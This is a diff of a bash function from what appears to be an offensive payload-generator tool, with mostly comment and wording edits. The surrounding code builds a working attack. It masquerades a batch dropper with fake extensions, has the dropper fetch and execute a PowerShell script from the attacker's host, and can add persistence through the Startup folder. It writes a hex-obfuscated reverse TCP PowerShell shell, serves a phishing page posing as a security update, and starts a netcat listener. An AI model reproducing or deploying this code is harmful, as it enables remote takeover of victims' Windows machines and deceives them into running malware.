@@ -12303,7 +12303,6 @@ sh_menu
 # ----------------------------------------------
 sh_evasion3 () {
 Colors;
-
 ## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
 echo "---"
 echo "- ${YellowF}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
@@ -12314,6 +12313,8 @@ echo "- from sending samples to \$Microsoft.. (just in case)."${Reset};
 echo "---"
 sleep 2
 
+
+## Get (store) User Inputs (bash variable declarations)..
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-ID00788\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
@@ -12321,7 +12322,7 @@ NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: Security-upda
 rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: %tmp%\nexample: %userprofile%\\\\\\\Desktop" --entry --width 350) > /dev/null 2>&1
 
 
-## setting default values in case user have skip this ..
+## Setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="443";fi
 if [ -z "$Drop" ]; then Drop="Update-ID00788";fi
@@ -12329,11 +12330,10 @@ if [ -z "$rpath" ]; then rpath="%tmp%";fi
 if [ -z "$NaM" ]; then NaM="Security-update";fi
 
 
-## Random chose one fake extension
+## Random chose one fake extension.
 # to Masquerade the dropper real extension (MITRE T1036)
-index=$(cat /dev/urandom | tr -dc '1-4' | fold -w 1 | head -n 1)
-## if $conv number output 'its small than' number 3 ...
-if [ "$index" = "1" ]; then
+index=$(cat /dev/urandom | tr -dc '1-5' | fold -w 1 | head -n 1)
+if [ "$index" = "1" ] || [ "$index" = "5" ]; then
    ext="crdownload"
 elif [ "$index" = "2" ]; then
    ext="cfg"
@@ -12344,7 +12344,7 @@ elif [ "$index" = "4" ]; then
 fi
 
 
-# display final settings to user
+## Display final settings to user.
 echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};sleep 1
 echo "${BlueF}[${YellowF}i${BlueF}]${white} Random Extension:([${GreenF}$ext${white}]) (MITRE T1036)"${Reset};sleep 2
 echo ${BlueF}"---"
@@ -12359,10 +12359,10 @@ cat << !
 echo "---"
 
 
-## BUILD DROPPER
+## BUILD DROPPER (to download/execute our agent.ps1).
 # echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1 # <-- OLD DELIVERY METHOD (dropper)
 echo "${BlueF}[☠]${white} Building Obfuscated batch dropper ..${white}";sleep 2
-persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper ?\n\nHow It Works: '$Drop.$ext.bat' IF executed will download/exec our '$NaM.ps1'\n(to the UPLOAD Location chosen by attacker) and writes 'Persiste.bat' into target\nStartup folder. ( Persiste.bat will execute our '$NaM.ps1' on every reboot )\n\nThe attacker just needs to start one netcat handler on sellected port." --radiolist --column "Pick" --column "Option" FALSE "No (default)" TRUE "Add persistence" --width 370 --height 200) > /dev/null 2>&1
+persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\nHow It Works: '$Drop.$ext.bat' IF executed will download/exec our '$NaM.ps1'\n(to the UPLOAD Location chosen by attacker) and writes 'Persiste.bat' into target\nStartup folder. ( Persiste.bat will execute our '$NaM.ps1' on every reboot )\n\nThe attacker just needs to start one netcat handler on sellected port." --radiolist --column "Pick" --column "Option" FALSE "No (default)" TRUE "Add persistence" --width 370 --height 200) > /dev/null 2>&1
 
 if [ "$persistence" = "No (default)" ]; then
    echo "@echo off" > $IPATH/output/$Drop.$ext.bat
@@ -12394,7 +12394,7 @@ strip="\"$um\"","\"$dois\"","\"$tres\"","\"$quato\"";hexed=$strip
 echo "${BlueF}[☠]${white} Obfuscated ip addr (hex):${GreenF}$hexed${white}";sleep 2
 
 
-## Build Reverse Powershell Shell (obfuscated)
+## Build Reverse TCP Powershell Shell (hex obfuscated).
 echo "${BlueF}[☠]${white} Writting Reverse Powershell Shell to output ..";sleep 2
 echo "<#" > $IPATH/output/$NaM.ps1
 echo "Obfuscated (hex) Reverse Powershell Shell" >> $IPATH/output/$NaM.ps1
@@ -12405,7 +12405,7 @@ echo "" >> $IPATH/output/$NaM.ps1
 echo "while (\$true) {\$px = $hexed;\$p = (\$px | ForEach { [convert]::ToInt32(\$_,16) }) -join '.';\$w = \"GET /index.html HTTP/1.1\`r\`nHost: \$p\`r\`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0\`r\`nAccept: text/html\`r\`n\`r\`n\";\$s = [System.Text.ASCIIEncoding];[byte[]]\$b = 0..65535|%{0};\$x = \"n-eiorvsxpk5\";Set-alias \$x (\$x[\$true-10] + (\$x[[byte](\"0x\" + \"FF\") - 265]) + \$x[[byte](\"0x\" + \"9a\") - 158]);\$y = New-Object System.Net.Sockets.TCPClient(\$p,$lport);\$z = \$y.GetStream();\$d = \$s::UTF8.GetBytes(\$w);\$z.Write(\$d, 0, \$d.Length);\$t = (n-eiorvsxpk5 whoami) + \"> \";while((\$l = \$z.Read(\$b, 0, \$b.Length)) -ne 0){;\$v = (New-Object -TypeName \$s).GetString(\$b,0, \$l);\$d = \$s::UTF8.GetBytes((n-eiorvsxpk5 \$v 2>&1 | Out-String )) + \$s::UTF8.GetBytes(\$t);\$z.Write(\$d, 0, \$d.Length);}\$y.Close();Start-Sleep -Seconds 3}" >> $IPATH/output/$NaM.ps1
 
 
-## Building Download webpage
+## Building the Download Webpage Sellected.
 echo "${BlueF}[☠]${white} Building HTTP Download WebPage (apache2) .."${Reset};sleep 2
 phish=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Download Pages:" --radiolist --column "Pick" --column "Option" FALSE "Mega-Upload (default)" TRUE "Cumulative Security Update" --width 350 --height 200) > /dev/null 2>&1
 if [ "$phish" = "Mega-Upload (default)" ]; then
@@ -12421,10 +12421,10 @@ fi
 cd $IPATH
 
 
-## Copy files to apache2 webroot
+## Copy ALL files to apache2 webroot 
 cd $IPATH/output
 zip $Drop.zip $Drop.$ext.bat > /dev/nul 2>&1
-#zip $Drop.zip $Drop.ps1 > /dev/nul 2>&1 # <-- OLD DELIVERY METHOD (dropper)
+# zip $Drop.zip $Drop.ps1 > /dev/nul 2>&1 # <-- OLD DELIVERY METHOD (dropper)
 echo "${BlueF}[☠]${white} Porting ALL required files to apache2 .."${Reset};sleep 2
 cp $IPATH/output/$NaM.ps1 $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
 cp $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1
@@ -12444,14 +12444,14 @@ echo "${BlueF}---"${Reset};
 echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
 read odf
 rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
-## START HANDLER
+## START NETCAT HANDLER ON SELLECTED PORT NUMBER
 cd $IPATH/output
 xterm -T " NETCAT LISTENER - $lhost:$lport" -geometry 110x23 -e "sudo nc -lvp $lport"
 cd $IPATH
 sleep 2
 
 
-## Clean old files
+## Clean old files.
 echo "${BlueF}[☠]${white} Please Wait, cleaning old files ..${white}";sleep 2
 rm $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
 rm $ApAcHe/$Drop.zip > /dev/nul 2>&1
@@ -12463,7 +12463,7 @@ rm $ApAcHe/Download.html > /dev/nul 2>&1
 
 ## Remark related to 'persistence' function..
 if [ "$persistence" = "Add persistence)" ]; then
-   zenity --title="☠ Reverse Powershell Shell (hex obfuscation) ☠" --text "REMARK:\nTo delete 'persistence' we need to manualy delete the follow two scripts\n\n1 - $rpath\\$NaM.ps1\n2 - %appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Persiste.bat" --info > /dev/null 2>&1
+   zenity --title="☠ Reverse Powershell Shell (hex obfuscation) ☠" --text "REMARK:\nTo delete 'persistence' we need to manualy delete the follow two scripts\n\n1 - $rpath\\$NaM.ps1 (agent.ps1)\n2 - %appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Persiste.bat (persistence script)" --info > /dev/null 2>&1
 fi
 sh_menu
 }
